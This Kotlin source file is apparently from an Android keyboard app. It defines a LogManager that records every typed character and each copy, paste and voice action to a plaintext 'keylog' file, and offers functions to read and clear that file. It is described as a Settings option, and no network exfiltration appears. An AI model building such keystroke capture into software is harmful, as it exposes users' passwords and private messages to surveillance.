package com.alfa.board

import android.content.Context
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LogManager(context: Context) {

    private val file = File(context.filesDir, "ab_keylog.txt")
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    private val lineBuf = StringBuilder()
    private var currentApp = "unknown"
    private var sessionStart = fmt.format(Date())

    fun log(input: String) {
        try {
            when {
                input.startsWith("[") -> {
                    // Special action log (copy/paste/cut/voice/banglish)
                    flush()
                    file.appendText("[${fmt.format(Date())}] ACTION: $input\n")
                }
                input == "\n" || input == " " -> {
                    lineBuf.append(if (input == " ") " " else "\n")
                    if (input == "\n" || lineBuf.length >= 100) flush()
                }
                else -> {
                    lineBuf.append(input)
                    if (lineBuf.length >= 100) flush()
                }
            }
        } catch (_: Exception) {}
    }

    private fun flush() {
        if (lineBuf.isEmpty()) return
        try { file.appendText("[${fmt.format(Date())}] TYPED: $lineBuf\n") }
        catch (_: Exception) {}
        lineBuf.clear()
    }

    fun read(): String {
        flush()
        return try {
            if (file.exists() && file.length() > 0) {
                "=== ALFA BOARD KEYLOG ===\n" +
                "Session: $sessionStart\n" +
                "File size: ${sizeKb()} KB\n" +
                "========================\n\n" +
                file.readText()
            } else "No logs recorded yet.\nEnable keylogger in Settings."
        } catch (_: Exception) { "Error reading log." }
    }

    fun clear() {
        lineBuf.clear()
        try { if (file.exists()) file.delete() } catch (_: Exception) {}
        sessionStart = fmt.format(Date())
    }

    fun sizeKb(): Long = if (file.exists()) file.length() / 1024 else 0
}
